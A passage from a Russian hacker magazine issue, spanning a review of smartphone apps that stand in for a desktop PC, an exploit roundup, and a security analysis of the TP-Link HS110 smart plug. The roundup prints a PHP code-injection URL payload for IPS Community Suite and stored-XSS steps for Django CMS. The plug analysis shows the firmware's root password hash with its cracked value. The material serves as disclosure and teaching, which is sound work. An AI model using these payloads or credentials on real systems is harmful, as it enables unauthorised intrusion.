чать и установить QHSUSB_Driver, после чего телефон должен определиться
как Qualcomm HS-USB QDLoader 9008. Далее понадобятся специфические
файлы для устройства и утилиты BoardDiag и LG Flashtool. Полную инструкцию
можно найти на форуме.

ВЫВОДЫ
Как видишь, даже в случае больших поломок с аппаратом все еще можно хоть
с трудом, но работать или по крайней мере вытащить из него важную инфор-
мацию. А уж Nexus убить практически нереально. Надо очень постараться
умышленно прошить файл от другого устройства или выдернуть шнур в момент
прошивки. Надеюсь, этой статьей я подвигну тебя к изучению внутренностей
и принципов работы устройств и помогу сэкономить нервы при будущих по-
ломках.
MOBILE


ДЕСКТОП
ПОВЫШЕННОЙ




                                                                             Денис ПогребнойМОБИЛЬНОСТИ                                                                                               denis2371@gmail.com


РАЗБИРАЕМСЯ, МОЖЕТ ЛИ СМАРТФОН
ИЛИ ПЛАНШЕТ ЗАМЕНИТЬ НАСТОЛЬНЫЙ ПК



Современные мобильные устройства даже среднего це-
нового диапазона по мощности сравнимы с ПК десяти-
летней давности, а порой их значительно превосходят.
Со многими задачами, выполняемыми на стационарных
ПК с десктопными ОС, сейчас вполне может справиться
твой смартфон. В этой статье мы ответим на вопрос, мож-
но ли использовать смартфон в качестве ПК, в том чис-
ле редактировать документы, разрабатывать ПО, хакать
софт, моделировать в 3D, редактировать фото и видео
и выполнять научные расчеты.

РАБОТАЕМ С ОФИСНЫМИ ДОКУМЕНТАМИ
Наверняка ты знаешь, что есть Word, Excel и PowerPoint для Android, iOS
и Windows Phone. Только по возможностям они существенно уступают деск-
топным аналогам. К примеру, редактор формул для Word еще не появился (из-
за чего многие студенты технических вузов не могут нормально делать курсо-
вые во время пар), не все инструменты форматирования страницы доступны
в Word, в Excel до сих пор невозможно открывать некоторые таблицы со спец-
ифичным форматированием.
   К счастью, у Microsoft есть конкуренты.
OfficeSuite обладает значительно больши-
ми возможностями по форматированию
текста, более «взрослым» интерфейсом
и большим количеством функций. Правда,
pro-версия стоит аж 1000 рублей.
  В серьезные  конкуренты можно  за-
числить Smart Office 2, WPS Office, Polaris
Office и набор приложений  от  Google
(Таблицы,   Документы,   Презентации).
Но у всех этих конкурентов (в том числе
у  OfficeSuite) есть существенный минус,
перечеркивающий почти все достоинства:
они очень часто отображают документы,
набранные в обычном MS Office, с искаже-
ниями. Нередко страдает форматирова-
ние. Сохранять исходное форматирование
doc- и docx-документов один в один умеют
только приложения от Microsoft.
   Управление на мобильных устройствах
тоже не самое удобное. Главная пробле-
ма — информация отображается очень
мелко, страницы прокручиваются медлен-
                                                                           Microsoft Wordно. На смартфонах, чтобы внести прав-
ку, необходимо увеличить фрагмент тек-
ста и пытаться попасть пальцем в мелкую точку на экране, а такие действия,
как копирование и вставка, превращаются в целую эпопею. Да и писать текст
на экранной клавиатуре — ужасная маета. По большому счету единственное
офисное приложение, которое можно назвать удобным, — это Microsoft Word.
На устройствах с маленьким экраном (меньше семи дюймов) можно впол-
не комфортно не только изменять размер шрифта, но и перемещать картинку
по документу, чертить рисунки и создавать таблицы. А в девайсах с экраном
от семи дюймов интерфейс отображается в привычном «ленточном» стиле.

AndrOpen Office

Пользователям  альтернативных  версий
офисов, которые хранят файлы в фор-
мате OpenDocument  (.odt), рекомендую
обратить внимание на AndrOpen  Office.
Это порт полноценного офисного пакета
OpenOffice.





                                   AndrOpen
                                             Office


РАЗРАБАТЫВАЕМ ПО
Для Android существует полноценная среда разработки приложений AIDE. Ко-
нечно, возможностей по сравнению с Eclipse или Android Studio не слишком
много, но достаточно для того, чтобы с нуля написать любое приложение или
что угодно поменять в уже созданном проекте (это вопрос только времени
и знаний). Поддерживаются языки Java и С/C++, есть отладчик, подсветка син-
таксиса, продвинутая система подсказок при вводе, проверка на ошибки в ре-
альном времени. В приложении присутствует редактор графического интер-
фейса. Он не очень удобен, но довольно функционален. AIDE умеет работать
с проектами, созданными в Android Studio и Eclipse. Но есть и недостатки:
не всякий код нормально компилируется, компилятор не понимает кириллицу.
   Существует   также   премиум-версия.
Она включает в себя некоторые полезные
для опытных разработчиков функции: сохра-
нение проекта более чем из пяти файлов,
автоматический запуск без необходимости
подтверждения, поддержка Git и прямой пу-
бликации APK в маркете. За дополнитель-
ную плату можно разблокировать доступ
к урокам по программированию (курс по-
священ языку Java и разработке приложе-
ний под Android, в том числе Android Wear).
Обучение программированию ведется с по-
мощью самого приложения. Задания очень
простые, но на английском.
   Есть и версия AIDE для разработки
веб-приложений — AIDE Web. Интерфейс
почти полностью идентичен AIDE. Наби-
рать код так же удобно благодаря обшир-
ному инструментарию.
  В iOS программировать на C и C++
можно с помощью IDE CppCode. Тут есть
и менеджер файлов, и редактор с подсвет-
кой синтаксиса, а также простенький отлад-
чик и компилятор. Для работы с JavaScript                                                                         AIDE
удобно пользоваться JavaScript Anywhere.
Тут все стандартно: слева — панель доку-
ментов, справа — панель для редактирования кода. Три вкладки: HTML, CSS
и JS. А еще есть интеграция с Dropbox и менеджер загрузки изображений.

ХАКАЕМ СОФТ
Macro HEX Edit — шестнадцатеричный редактор. По сравнению с хороши-
ми hex-редакторами для компьютера (Hiew, FileInsight, 010 Editor) это просто
детская игрушка. Однако в состав Macro HEX Edit входят инструменты для ре-
дактирования, поиска, работы с адресами и символьными метками, а так-
же интерпретатор, позволяющий исполнять произвольные скрипты, отобра-
жать результат в графическом виде или же вносить изменения в файл. Так что
при желании редактировать бинарные файлы можно.
   Для Windows Phone есть 0x Hex Viewer. Разработчик просит за него один
доллар, и это единственный шестнадцатеричный редактор для Windows. Так
что если он понадобится — придется заплатить. В iOS хороший hex-редактор
встроен в iFile.





                                                                  build.prop в Macro HEX Edit

APK Editor — очень удобный редактор файлов APK. В нем есть несколько ре-
жимов редактирования:
•  редактирование ресурсов. Можно выполнить перевод приложения и про-
   смотреть его манифест (AndroidManifest.xml). Редактировать манифест
   неудобно, потому что отсутствует подсветка синтаксиса и горизонтальная
   прокрутка, — чтобы увидеть полную надпись в строке, приходится нажимать
   на нее;
•  замена файлов. Режим, в котором можно подменять различные ресурсы
   (звуки, изображения, конфигурационные файлы и так далее) на свои соб-
   ственные;
•  общее редактирование. В этом режиме можно поменять основные параме-
   тры, то есть название приложения, место установки, код и название версии.

Сразу после редактирования приложение
можно подписать. Однако в результате ты
получишь пакет, подписанный твоим соб-
ственным ключом, а значит, ни установить
его «поверх» оригинала, ни обновить ты
уже не сможешь. Единственное ограниче-
ние бесплатной версии в том, что нельзя
редактировать AndroidManifest.xml.
  Файлы APK можно  модифицировать
с помощью MT Manager. Он требует пра-
ва root, но обладает значительно большим
арсеналом возможностей, чем APK Editor:
например, тут есть hex-редактор, RGB-ре-
дактор, редактор DEX, перевод через Baidu
и Yandex. Часть функций доступна толь-
ко в аккаунте VIP, который стоит 2 доллара
в год или 5 долларов бессрочно.
   Декомпилировать,      рекомпилиро-
вать, подписывать файлы с расширением
*.apk, *.jar, *.dex, *.odex можно с помощью
Apktool.
  В целом для Android много программ,
которые позволяют не только создавать
                                               Переводим приложение в APK Editorприложения с нуля, но и собирать/разби-
рать, хакать и изучать уже существующие.
К сожалению, по функциональности и удобству работы все они сильно уступа-
ют аналогам с компьютера. На iOS подобных программ поменьше, и стоят они
намного дороже.

МОДЕЛИРУЕМ В 3D
Onshape — по заверению разработчиков — это полноценный CAD-редактор.
Он доступен для Android и iOS. А еще есть веб-версия этого приложения, ра-
ботающая в любом современном браузере.
   Гибридный интерфейс предполагает, что в работе Onshape одновременно
использует ресурсы устройства и собственные облачные ресурсы. Другими
словами, это GitHub для CAD-интерфейсов. Каждый может работать над сво-
им участком проекта, а затем платформа объединяет все изменения. Продукт
предусматривает безопасную работу над одними и теми же участками проекта
с нескольких рабочих столов. Пользователи, которые работали с AutoCAD,
Компас-3D, Creo Parametric и другими CAD-редакторами, не будут испытывать
серьезных проблем с освоением интерфейса, здесь присутствуют почти все
основные функции, а принцип создания моделей практически тот же, что
на настольных ПК.
   Управление, как и полагается, ужас-
но неудобное. На мобильном устройстве
слишком маленький экран для отображе-
ния всех функций, а также самой модели
и настройки вносимых изменений, поэтому
большую часть времени придется бродить
по различным меню, постоянно переме-
щать и масштабировать модель. На план-
шетах дела с этим обстоят значительно
лучше, но на смартфоне редактировать за-
мучаешься.
   Для   художественного   3D-модели-
рования  на  Android  можно  обратить-
ся к Spacedraw. В этой программе скрыт
огромный потенциал, но воспользовать-
ся им ты сможешь, только если знаешь
английский язык и имеешь навыки рабо-
ты в полноценном редакторе, например
Blender или 3ds Max. На iOS для 3D-твор-
чества можно воспользоваться forger.
  В   целом   мощностей   мобильных
устройств вполне хватает для 3D-модели-
рования. Сложности могут возникнуть толь-
                                                       Операции изменения
ко с управлением и с открытием серьезных                                                            в Onshape на Android
инженерных проектов (с некоторыми сбор-
ками механизмов, машин и прочего мо-
гут нормально работать только мощные современные процессоры, например
Core i5, i7 последних поколений или AMD FX 9590 и подобные ему + часто тре-
буются мощные видеокарты). Создавать трехмерные чертежи более-менее
удобно на планшете, а на смартфоне (особенно с маленьким экраном) черче-
ние превращается в настоящее издевательство.

Если нужно открывать файлы, созданные на компьютере

У Autodesk существует собственное приложение для Android, iOS, Windows
Phone. Оно имеет много инструментов для просмотра и редактирования
2D-чертежей (в формате DMG), а для просмотра 3D в DWG, SLFPRT, IPT, IAM,
CATPART, IGES, STEP, STL можно воспользоваться Fusion 360 на Android и iOS.
   Пользователям Компас-3D может пригодиться KOMPAS:24 для Android, ко-
торый предназначен для просмотра моделей деталей (*.m3d), моделей сбо-
рок (*.a3d), чертежей (*.cdw), фрагментов (*.frw), спецификаций (*.spw), тек-
стовых документов (*.kdw).
   STL-файлы удобно смотреть с помощью Graphite на Android, ViewSTL
на Windows Phone и STL Viewer для iOS.


РЕДАКТИРУЕМ ФОТО, ВИДЕО, МУЗЫКУ
Видеоредакторы
На iOS все сразу понятно — это дорогущий (около 1000 рублей) Pinnacle Studio.
Структура редактора хорошо спланирована и имеет привычный для пользова-
телей настольных версий приложения вид. Приверженцам других видеоредак-
торов интерфейс тоже будет относительно привычен.
   У Pinnacle долгое время не было достойных конкурентов для Android, но те-
перь такой есть — KineMaster. Этот редактор имеет довольно много функций.
Управление сопоставимо по удобству и принципу с Adobe Premiere Pro CC
для настольных компьютеров. И только опытные пользователи, привыкшие ра-
ботать с горячими клавишами на компьютерных видеомонтажных программах,
могут испытывать дискомфорт, роясь в различных меню.
   Однако по возможностям KineMaster дотягивает лишь до настольного ре-
дактора начального уровня OpenShot, так что о полноценной замене Adobe
Premiere Pro CC говорить не приходится. Но не все так печально для рядово-
го пользователя. KineMaster умеет работать с несколькими видео- и аудио-
дорожками; умеет добавлять различные эффекты (переходы 3D, вытеснение,
угасание и многое другое), поддерживает видеослои: наложение видео, ру-
кописного текста (интересная функция), картинок, печатного текста и прочего
на другие видео; позволяет вручную управлять цветом, яркостью и насыщен-
ностью, скоростью воспроизведения видеороликов и включает в себя много
инструментов для управления звуковой дорожкой. И это я перечислил далеко
не все функции.
   Монтаж заслуживает отдельного внимания — видео можно порезать на ку-
ски не только для того, чтобы убрать оттуда начало, середину или вырезать
какой-нибудь момент. Здесь все как в полноценном редакторе: режем видео
на части и делаем с этими частями что захотим, то есть добавляем в них эф-
фекты, обрезаем по краям, дублируем, выравниваем звук, ускоряем воспро-
изведение и так далее. У меня возникла всего одна проблема: нарезанные
куски видео не получается перемещать между слоями — новый слой добав-
ляется только вместе с добавлением к проекту нового видеофайла, аудио или
картинки (склейка видео, конечно, поддерживается). Видеоредактор работает
с видеоформатами MP4 (H.264 baseline/main/high profile + AAC LC), 3GP (H.264
baseline/main/high profile + AAC LC), MOV (только H.264 + AAC LC). Из аудио
поддерживается только MP3, M4A, AAC. Изображения могут быть только JPG
и PNG. На Nexus 5 KineMaster отлично работает с Full HD, но разрешение 4K
не поддерживается. Все функции доступны в бесплатной версии, только вот
на видео будет отображаться водяной знак. Подписка на pro-версию на месяц
стоит около 170 рублей, а на год 1360 рублей.
   Владельцы Windows Phone будут вынуждены раскошелиться на 100 рублей
для покупки полноценной версии Movie Maker, так как бесплатная не умеет
сохранять отредактированное видео. У этого видеоредактора своеобразный
интерфейс, но пользоваться удобно. Как и во всех нормальных редакторах,
присутствует несколько лент для отдельной обработки видео, аудио и изобра-
жений. По возможностям значительно уступает Pinnacle Studio и KineMaster.
   Попробовав поработать с видео на смартфоне, я пришел к выводу, что
функциональности хорошего видеоредактора для Android, iOS и Windows
Phone хватит даже требовательным пользователям. Проблема может возник-
нуть разве что с небольшим количеством поддерживаемых форматов и коде-
ков, с ограничением разрешения видео (не все смартфоны могут кодировать
4K-видео) и относительно маленьким количеством накладываемых на видео
эффектов.





                                                Редактируем видео в KineMaster

Фоторедакторы
Для мобильных платформ очень много хороших фоторедакторов. Среди них
выгодно отличается PicsArt (iOS, Android, Windows Phone), несущий на борту
множество функций, начиная от огромной базы различных эффектов и закан-
чивая целым арсеналом инструментов для обрезки изображения.
   Также в редакторе есть продвинутый
инструмент для рисования, поддержива-
ющий кисти, маски и слои. Для кистей до-
ступна масса различных эффектов, что по-
зволяет с комфортом воплощать в жизнь
свои творческие мысли. Настоящая фото-
студия для мобильного устройства, кото-
рая превосходит всех конкурентов на мо-
бильных платформах.
   Тем не менее тот же бесплатный Gimp
(для стационарных ПК) обладает в десятки
раз большим инструментарием, поддер-
живает плагины, добавляющие такие функ-
ции, какие, наверное, и не снились разра-
ботчикам PicsArt. Я протестировал много
различных  фоторедакторов  для  Android
и с уверенностью могу заявить, что они,
даже все вместе взятые, не смогут обеспе-
чить тех возможностей, которые предостав-
ляет Gimp, не говоря уже о всеми любимом
Adobe Photoshop CC. Кроме того, в PicsArt
разочаровывает  отсутствие  нормальной
поддержки слоев (слои работают только
в режиме рисования), отсутствие фильтра                                                    Накладываем одно
для устранения красных глаз (хотя отбели-             изображение на другое
вание зубов, нанесение загара и подобные
фишки имеются), отсутствие выбора  ка-
чества сохраняемых фото и скудное число
форматов (только PNG и JPEG).

Аудиоредакторы
Doninn Audio Editor для Android уже сейчас, хоть и появился совсем недавно,
по возможностям превосходит всех конкурентов из Play Market. Умеет читать
аудио почти во всех существующих форматах, но сохраняет только в WAV,
MP3, FLAC, Ogg. В качестве бонуса присутствует диктофон, записывающий
WAV и MP3 с частотой дискретизации до 320 Кбит/с. Бесплатная версия отли-
чается от платной только тем, что длительность сохраняемых файлов ограни-
чена до трех минут.
   Для  iOS  существует  даже  более  функциональный  аудиоредактор
TwistedWave. Правда, форматов он понимает меньше: WAV, AIFF, CAF, AAC,
MP3, FLAC.
   Lexis Audio Editor, возможно, лучшее, что есть для редактирования зву-
ка под Windows Phone. Поддерживается не очень много форматов: MP3 (до
320 Кбит/с), WAV (16 Bit PCM), WMA (до 192 Кбит/с), M4A (до 192 Кбит/с). Да
и функций не так уж и много.





                                                               Doninn Audio Editor

НАУЧНЫЕ ВЫЧИСЛЕНИЯ
Для мобильных платформ хороших программ для научных вычислений, к сожа-
лению студентов технических вузов, практически нет. Но все-таки некоторые
продукты заслуживают внимания.
   Например, официальное приложение WolframAlpha, доступное для iOS,
Android и Windows Phone. Умеет в облаке производить практически любые
вычисления, например решать систему из дифференциальных уравнений.
WolframAlpha — это не просто крутой калькулятор. Это база знаний и набор вы-
числительных алгоритмов, вопросно-ответная система. В ответ на введенное
выражение WolframAlpha возвращает ответ, основываясь на собственной базе
знаний, которая содержит данные по математике, физике, астрономии, химии,
биологии, медицине, истории, географии, политике, музыке, об известных
людях, интернет-сайтах и многом другом. Серьезный минус только в том, что
для полноценного использования придется изучить много справочного мате-
риала (хоть система и понимает выражения на естественном английском).
   Если ты хорошо знаешь синтаксис Wolfram Mathematica, то можешь по-
пробовать Wolfram Cloud: Android, iOS. Это полноценная облачная програм-
ма математического моделирования со многими интересными фишками. Еще
для мобильных устройств есть MATLAB (iOS и Android). Мобильная версия
тоже работает через облако и является прямым конкурентом Wolfram Cloud,
но, честно признаюсь, Wolfram Cloud круче. Для Android-устройств есть Octave.
Это очень старая программа для математических вычислений, портированная
на Android. Она работает на самом устройстве, то есть безо всяких облаков,
но работает в режиме эмуляции, так что скорость очень медленная.
   Хоть и для мобильных платформ нет полноценных пакетов для математи-
ческих вычислений, но того, что есть, хватит с запасом студентам почти всех
математических специальностей. Единственный минус — все нормальные
программы требуют доступа к интернету и платной подписки. А ведь многие
научные открытия (в том числе в математике и физике) были совершены с по-
мощью обычного листа бумаги, ручки и вспомогательных таблиц.

Клавиатура и мышь

Не все знают, что на Android есть полноценная поддержка мыши и клавиатуры
с горячими клавишами. Распознаются и работают эти устройства из коробки
как по USB (если есть OTG), так и по Bluetooth. Для клавиатуры существует це-
лый арсенал горячих клавиш. Вот список основных сочетаний:
•  Esc — кнопка «Назад»;
•  Win + Esc — кнопка «Домой»;
•  Ctrl + Esc — кнопка «Меню»;
•   Alt + Tab — переключение между приложениями;
•  Ctrl + Space — переключение раскладки;
•  Ctrl + P — открыть настройки;
•  Ctrl + M — управление установленными приложениями;
•  Ctrl + W — смена обоев;
•  Win + E — написать письмо;
•  Win + P — проигрыватель музыки;
•  Win + A — калькулятор;
•  Win + S — написать SMS;
•  Win + L — календарь;
•  Win + C — контакты;
•  Win + B — браузер;
•  Win + M — карты Google;
•  Win + Space — поиск;
•  Ctrl + Alt + Del — перезагрузка.


Полноценный десктоп в кармане

В настоящее время активно разрабатываются и модифицируются операцион-
ные системы, позволяющие использовать смартфон как настоящий ПК после
подключения клавиатуры, мыши и монитора.
   Подобная функция существует в Ubuntu Phone. Правда, даже в режиме
Desktop не удастся ставить утилиты из основных репозиториев (хранилищ про-
грамм) для Ubuntu — слишком сильно Ubuntu Phone отличается от настольно-
го варианта системы.
   Есть также Continuum от Microsoft. Появился этот режим в некоторых смарт-
фонах с Windows 10 Mobile. И с ним примерно те же проблемы, что и в Ubuntu
Phone. Разработчики должны специально оптимизировать приложения.
   Для Nexus 5 существует очень интересная прошивка Maru OS. Она совме-
щает в себе Android 5.1 (Lollipop) и Debian. Если подключить Nexus 5 с этой
прошивкой к монитору или телевизору, он автоматически распознает под-
ключение и запустит Debian, превратившись в полноценный десктоп. Причем
смартфон продолжит функционировать независимо от десктопа.


ВЫВОДЫ
На сегодняшний момент смартфон хоть и не может полностью заменить на-
стольный ПК, но уже движется в этом направлении. Как ты мог убедиться, мощ-
ности мобильных девайсов вполне достаточно для выполнения многих деск-
топных задач. Основные проблемы связаны с небольшой площадью экрана,
ограниченным объемом внутренней памяти, коротким временем существова-
ния платформ (многие продукты под Windows, Mac и Linux разрабатываются
уже десятки лет). Но, несмотря на все недостатки, для оперативного решения
возникших задач ты вполне можешь рассчитывать на смартфон или планшет.
Ведь он всегда под рукой.
ВЗЛОМ





                                                                               Борис Рютин,
                                                                                                                              Digital Security
                                                                                                        b.ryutin@dsec.ru
                                                                                       @dukebarman
     WARNING                                                                       dukebarman.pro

       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
     Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
     материалами данной
             статьи.

ОБЗОР
ЭКСПЛОИТОВ
   АНАЛИЗ НОВЫХ УЯЗВИМОСТЕЙ





     Сегодняшний обзор эксплоитов порадует тебя удаленным
    выполнением кода в IP.Board, а также расскажет, где кроется
   хранимая XSS в Django CMS — популярной системе управления
            контентом, основанной на Django. Welcome!


ИНЪЕКЦИЯ PHP-КОДА В IPS COMMUNITY SUITE 4.1.12.3
 CVSSv2:     N/A
 Дата релиза: 7 июля 2016 года
 Автор:        Egidio Romano
 CVE:         2016-6174

IPS Community Suite — это популярный движок для создания форумов, ранее
известный под именем IP.Board, частый гость на страницах нашего журнала,
пусть и с большими перерывами. Сегодняшняя уязвимость позволит нам вы-
полнить произвольный PHP-код на сервере. Сама ошибка находится в скрипте
/applications/core/modules/front/system/content.php:





Как обычно, проблема кроется в параметре HTTP-запроса content_class —
введенные пользователем данные недостаточно хорошо проверяются перед
использованием при вызове функции class_exists() в строке 40. Это по-
зволяет неавторизованному атакующему внедрить и выполнить свой PHP-код,
опираясь на автозагрузку функций, определенных в скрипте /applications/
cms/Application.php:





EXPLOIT
Пример выполнения функции phpinfo():

http://[host]/[ips]/index.php?app=core&module=system&controller=
   content&do=find&content_class=cms\Fields1{}phpinfo();/*

По словам автора, для успешной эксплуатации требуется, чтобы IPS Community
Suite был запущен под PHP с версиями 5.4.24 или 5.5.8.
   Оригинальный отчет об уязвимости.

TARGETS
•  IPS Community Suite <= 4.1.12.3.

SOLUTION
Есть исправление от производителя.


ХРАНИМАЯ XSS В DJANGO CMS 3.3.0 (EDITOR SNIPPET)
 CVSSv2:     N/A
 Дата релиза: 19 июля 2016 года
 Автор:         Vulnerability-Lab
 CVE:         2016-6186

Думаю, что рассказывать подробно про один из самых популярных Web-фрей-
мворков на языке Python — Django — тебе уж точно не надо. Django CMS как раз
и основана на нем, а в исправлении сегодняшней уязвимости участвовали сами
мемберы Django Security Team и Django Service Developer Team.
   Уязвимость находится в значении поля Name для формы Editors — Code
Snippet. Атакующий может внедрить туда свой собственный код, чтобы по-
лучить хранимую XSS. После ее добавления в список управление передается
на ./djangocms_snippet/snippet/. Полученное содержимое никак не обра-
батывается, и в результате у нас появляется возможность выполнить любую
полезную нагрузку внутри тега option.
  Надо сказать, что эта уязвимость вообще-то не такая опасная, ведь она
требует аккаунта с достаточными правами. Для ее успешной эксплуатации по-
надобится угнать сессию, провести фишинг-атаку или каким-то похожим обра-
зом получить хотя бы временный доступ к учетке.

EXPLOIT
Для воспроизведения уязвимости нужно сделать следующее:
1. Авторизоваться в Django CMS на сайте.
2. Открыть структуру модуля.
3. Кликнуть на редактирование страницы модуля (замечу, что теперь редак-
   тор открывается с плагинами по умолчанию).
4. Отметить кусок текста и кликнуть на плагин с фрагментами кода, чтобы на-
   строить установки по умолчанию.
5. Кликнуть на плюс, чтобы добавить новый фрагмент (snippet) кода.
6. Вставить JavaScript-код с полезной нагрузкой в поле ввода Name.
7. Сохранить, используя POST-запрос.
8. Теперь кликнуть на выпадающий список и выбрать созданную полезную
   нагрузку.
9. Скрипт выполняется при прокрутке выпадающего списка без какой-либо
   фильтрации.
10. Profit!

С помощью внедрения таких фрагментов можно эксплуатировать и другие ак-
каунты. Когда другой привилегированный пользователь включит у себя этот
фрагмент, то вызовет выполнение полезной нагрузки.





А вот пример запроса, который выберет данные для выпадающего списка:

GET http://django3-3-0.localhost:8080/en/admin/cms/staticplaceholder/
   add-plugin/a/[PERSISTENT SCRIPT CODE EXECUTION VIA SNIPPET NAME!]

В оригинальном отчете от Vulnerability-Lab представлен полный лог сессии
в момент эксплуатации.

TARGETS
•  Django Framework — Content Management System 3.3.0;
•  Django Framework — Content Management System MDB, 1.10, 1.9, 1.8 и 1.7.

SOLUTION
Есть исправление от производителя.
ВЗЛОМ
 (БЕЗ)УМНАЯ
  РОЗЕТКА





      АНАЛИЗ УЯЗВИМОСТЕЙ УМНОЙ
       РОЗЕТКИ TP-LINK HS110 WI-FI




Желание управлять всем вокруг с телефона
вполне понятно для любого, кто хоть как-то
связан с IT. Именно поэтому пару лет назад
в наших домах стали появляться умные чайни-     Борис Рютин,                                                                                                                              Digital Security
ки, лампочки и прочие «кофеварки на Linux».            b.ryutin@dsec.ru@dukebarman
А это, в свою очередь, означало, что рано или        dukebarman.pro
поздно подобные устройства попадут под
прицелы исследователей ИБ — это лишь вопрос време-
ни. Сегодня мы рассмотрим уязвимости в одном из таких
устройств — умной Wi-Fi-розетке TP-Link HS110 Wi-Fi.

О ЧЕМ РЕЧЬ
HS110 Wi-Fi — это Wi-Fi-розетка с мониторингом энергопотребления от TP-
Link. Устройство подключается к обычной розетке и после настройки предо-
ставляет:
•  удаленный доступ для управления подключенными устройствами со смарт-
  фона с помощью мобильного приложения Kasa;
•  подачу и отключение электричества по расписанию для управления подклю-
   ченными приборами;
•  мониторинг энергопотребления для просмотра статистики энергопотре-
   бления в реальном времени.





                                                      Умная розетка TP-Link
                                                         HS110 Wi-Fi





Разумеется, HS110 Wi-Fi — это далеко не первое устройство подобного клас-
са, так что долго останавливаться на его функциональности нет смысла. Ис-
следователи Любомир Штрётман (Lubomir Stroetmann) и Тобиас Эссер (Tobias
Esser) провели анализ разреверсенной прошивки розетки и ее Android-при-
ложения Kasa, сетевого трафика между приложением и устройством, а также
фаззинг его проприетарного протокола. На момент написания статьи об ис-
правлениях ошибок ничего известно не было, а поскольку устройство доста-
точно типовое, этот подход может успешно применяться для исследования
и других девайсов подобного класса.

НАСТРОЙКА УСТРОЙСТВА
Умная розетка имеет только две физические кнопки — переключатель «Вкл./
выкл.» и кнопку перезагрузки, которая сбрасывает настройки устройства,
если ее держать нажатой более пяти секунд. После включения ненастроенное
устройство с заводскими настройками запускает незащищенную точку досту-
па с именем вида TP-LINK_Smart  Plug_XXXX, где XXXX — четыре шестнад-
цатеричных числа. После быстрого поиска в WiGLE было найдено несколько
умных розеток TP-Link с настройками по умолчанию:





                  Список умных розеток TP-Link с настройками по умолчанию из WiGLE

Приложение от TP-Link для управления такими устрой-
ствами — Kasa подключает смартфон к созданной точке
доступа, отправляя широковещательные UDP-пакеты
255.255.255.255  для  поиска  IP-адреса  устройства
и последующей установки имени SSID и пароля, кото-
рые пользователь ввел в приложении. Затем умная ро-                                                        INFO
зетка выключает точку доступа и соединяется с указан-
ной Wi-Fi-сетью как клиент.                                            Кстати, не только умные
                                                                           розетки подключаются   Авторы  провели  KARMA-атаку,  используя MANA                                                                   подобным способом,
Toolkit от SensePost, принудительно деаутентифициро-     но и другие устройства.
вав умную розетку и попытавшись соединиться небез-     Например, популярный
                                                                                        (и неоправданноопасной поддельной точкой доступа с тем же именем.
                                                                              дорогой) комбайн
Увы, атака не увенчалась успехом, хотя таким образом                                                                                 LIFX настраивается
можно вызывать временный отказ от обслуживания     по схожему алгоритму.
устройства.

ИССЛЕДУЕМ ПРОШИВКУ TP-LINK HS110
Следующим шагом авторы скачали официальную прошивку для устройства
HS110(US)_V1_151016.zip и натравили на него binwalk для анализа содер-
жимого.





                                  Содержимое прошивки HS110(US)_V1_151016.zip


Как видишь, прошивка содержит обычную Linux-систему, состоящую из трех
частей:
•  U-Boot Bootloader 1.1.4 (Oct 16 2015 — 11:22:22);
•  Linux Kernel 2.6.31 — LSDK-9.2.0_U11.14 (yt@yangtao.localdomain);
•  Squashfs filesystem.

В файловой системе авторы нашли следующие интересные файлы:
1. /bin/busybox v1.01 (2015.10.16 — 03:17+0000).
2. /etc/newroot2048.crt — этот сертификат используется для проверки
   облачного сервера. Файл содержит корневой сертификат VeriSign Class
   3 Public Primary Certification Authority — G5. Это означает, что при установ-
   лении TLS-соединения в облако проверяется, подписан ли предоставлен-
   ный сервером сертификат с помощью Symantec VeriSign CA for Extended
    Validation (EV) certificates (CA pinning). Атакующий может купить себе соб-
   ственный EV-сертификат и использовать его для своего сервера, чтобы он
   «выглядел» как облако.
3. /etc/shadow — после дешифрования оказалось, что пароль media

root:7KBNXuMnKTx6g:15502:0:99999:7:::

4. /usr/bin/shd — основное серверное приложение.
5. /usr/bin/shdTester — клиент для калибровки экрана энергии.
6. /usr/bin/calDump — дамп данных калибровки из /dev/caldata.

Вся проприетарная серверная логика находится в исполняемом файле shd
(Smart Home Daemon), который является MIPS32 R2 Big Endian:

shd: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV),
dynamically linked, interpreter /lib/ld-uClibc.so.0,
corrupted section header size

Также в нем содержится OpenSSL 1.0.1j 15 Oct 2014 для установки TLS-со-
единения с облачным сервером.

BUSYBOX
Предоставляемая версия BusyBox из прошивки подвержена уязвимости CVE-
2011-2716, инъекции команд в компоненте udhcpc (DHCP-клиенте). Она позво-
ляет внедрять команды в одну из следующих DHCP-опций:
•  (12) Hostname;
•  (15) Domainname;
•  (40) NIS Domain;
•  (66) TFTP Server Name.

Проанализировав исполняемый файл, авторы нашли, что shd создает shell-
скрипт /tmp/udhcpc.script:

#!/bin/sh
if[ $1 = renew –o $1 = bound]
then
     ifconfig $interface $ip netmask $subnet
    route del default
    route add default gw $router
    echo "nameserver $dns" > /tmp/resolv.conf
fi

а затем выполняется udhcpc:

/sbin/udhcpc –b –H "HS100(US)" –i br0 –s /tmp/udhcpc.script

К сожалению, здесь hostname захардкожена, а другие опции не используются.
Так что уязвимость неэксплуатируема.

СКАНИРОВАНИЕ ПОРТОВ
Запустив Nmap после сканирования всех TCP и UDP, получили следующее:
•  80/tcp — HTTP;
•  9999/tcp — TP-Link Smart Home Protocol;
•  1040/udp — TP-Link Device Debug Protocol (TDDP).

Веб-сервер на 80-м порту отвечает бессмысленными троеточиями, вне зави-
симости от запроса:

HTTP/1.1 200 OK
Server: TP-LINK Smart Plug
Connection: close
Content-Length: 5
Content-Type: text/html
...

Внутри shd этот ответ HTTP-сервера зовется fake_httpd и всегда возвращает
захардкоженный ответ.

Что происходит на 9999/TCP и 1040/UDP

TCP-порт 9999 используется для управления умной розеткой в локальной сети
с помощью приложения Kasa и описан в TP-Link Smart Home Protocol, а UDP-
порт 1040 — в TP-Link Device Debug Protocol.


ИССЛЕДУЕМ TP-LINK SMART HOME PROTOCOL
Прослушав локальный Wi-Fi-трафик, авторы увидели, что мобильное прило-
жение общается с HS110 через порт 999, используя данные, похожие на за-
шифрованные. После декомпиляции Android-приложения они нашли функцию
шифрования:





                     Функция шифрования в мобильном приложении Kasa от TP-Link

Мы видим, что инициализирующий ключ (вектор) — это захардкоженное зна-
чение -85  (=  171). Первый байт открытого текста ксорится (XOR) с этим
ключом. Затем ключ ставится в незашифрованный байт. В ходе очередной
итерации следующий байт открытого текста ксорится с предыдущим байтом
открытого текста. Дешифровка работает по тому же принципу.
   Этот алгоритм известен как autokey cipher. Несмотря на то что его статиче-
